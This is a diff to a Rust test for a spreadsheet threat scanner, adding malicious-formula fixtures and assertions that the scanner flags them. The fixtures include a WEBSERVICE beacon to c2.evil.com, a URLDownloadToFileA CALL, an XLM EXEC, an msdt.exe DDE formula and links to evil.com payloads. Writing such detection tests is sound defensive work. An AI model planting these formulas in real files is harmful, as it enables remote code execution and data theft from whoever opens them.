@@ -1798,6 +1798,10 @@ fn e2e_cell_threat_advanced_evasion_detection() {
                 <c r=\"A5\"><f>=WEBSERVICE(\"http://c2.evil.com/beacon?st=\" &amp; A1)</f></c>\
                 <c r=\"A6\"><f>=HYPERLINK(\"https://phish.example.com/update.exe\", \"Click to Update\")</f></c>\
                 <c r=\"A7\"><f>=CALL(\"urlmon\",\"URLDownloadToFileA\",\"JJCCBB\",0,\"http://evil.com/a.exe\",\"c:\\temp\\a.exe\",0,0)</f></c>\
+                <c r=\"A8\"><f>=IF(1, EXEC (\"calc.exe\"))</f></c>\
+                <c r=\"A9\"><f>=HYPERLINK (\"ms-appinstaller:?source=https://evil.com/app.msix\", \"Install\")</f></c>\
+                <c r=\"A10\"><f>=msdt.exe|' /id PCWDiagnostic'!A0</f></c>\
+                <c r=\"A11\"><f>=HYPERLINK(\"http://evil.com/payload.jse\", \"Script\")</f></c>\
             </row>\
         </sheetData>\
     </worksheet>";
@@ -1835,6 +1839,12 @@ fn e2e_cell_threat_advanced_evasion_detection() {
     assert!(
         diags
             .iter()
+            .any(|d| d.contains("Potential DDE execution formula") && d.contains("msdt.exe")),
+        "should detect msdt.exe DDE: {diags:?}"
+    );
+    assert!(
+        diags
+            .iter()
             .any(|d| d.contains("Potential remote workbook link injection")
                 && d.contains("http://evil.example.com")),
         "should detect remote HTTP workbook link: {diags:?}"
@@ -1861,11 +1871,32 @@ fn e2e_cell_threat_advanced_evasion_detection() {
         "should detect executable download hyperlink: {diags:?}"
     );
     assert!(
+        diags
+            .iter()
+            .any(|d| d.contains("Suspicious executable download hyperlink")
+                && d.contains("ms-appinstaller:")),
+        "should detect ms-appinstaller protocol hyperlink: {diags:?}"
+    );
+    assert!(
+        diags
+            .iter()
+            .any(|d| d.contains("Suspicious executable download hyperlink")
+                && d.contains("payload.jse")),
+        "should detect jse script hyperlink: {diags:?}"
+    );
+    assert!(
         diags.iter().any(
             |d| d.contains("Potential Excel 4.0 (XLM) macro execution formula")
                 && d.contains("CALL")
         ),
         "should detect XLM CALL formula: {diags:?}"
+    );
+    assert!(
+        diags.iter().any(
+            |d| d.contains("Potential Excel 4.0 (XLM) macro execution formula")
+                && d.contains("EXEC")
+        ),
+        "should detect spaced/nested XLM EXEC formula: {diags:?}"
     );
 }
 
